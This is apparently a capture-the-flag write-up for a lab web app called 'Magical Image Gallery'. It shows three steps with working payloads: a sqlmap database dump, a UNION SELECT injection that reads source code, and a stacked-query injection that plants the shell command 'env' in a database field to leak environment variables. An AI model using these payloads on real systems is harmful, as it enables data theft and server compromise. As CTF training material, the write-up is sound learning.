# Magical Image Gallery

## 1. Flag 1

```shell
 sqlmap -u http://34.74.105.127/2d2add86c2/fetch?id=2 --dump --dbms MySQL --threads 10
```

Database: level5
Table: albums
[1 entry]

| id   | title   |
| ---- | ------- |
| 1    | Kittens |


Database: level5
Table: photos
[3 entries]

| id   | title            | parent | filename                                                     |
| ---- | ---------------- | ------ | ------------------------------------------------------------ |
| 1    | Utterly adorable | 1      | files/adorable.jpg                                           |
| 2    | Purrfect         | 1      | files/purrfect.jpg                                           |
| 3    | Invisible        | 1      | 68d620e8a1324fdb95745c261e0ca0c5363e5c106d2744d41bed40f38ef08f41 |
Flag is in row 3 filename add the Flag pefix and Suffix.



## 2. Flag 2

```http
view-source:http://34.74.105.127/2d2add86c2/fetch?id=0 union select "main.py" --
```

Gives code and contains a Flag.

## 3. Flag 3

Didn't knew about using commit actually executes multiple queries.

Tried redirecting command output to base64 but was splited by "\n" split in python code so used `tr`

```http
http://34.74.105.127/2d2add86c2/fetch?id=2; update photos set filename="; env | tr \"\n\" \" \"" where id=3 ; commit;--
```

Outputs the content of env on the home page. 

Contains flags.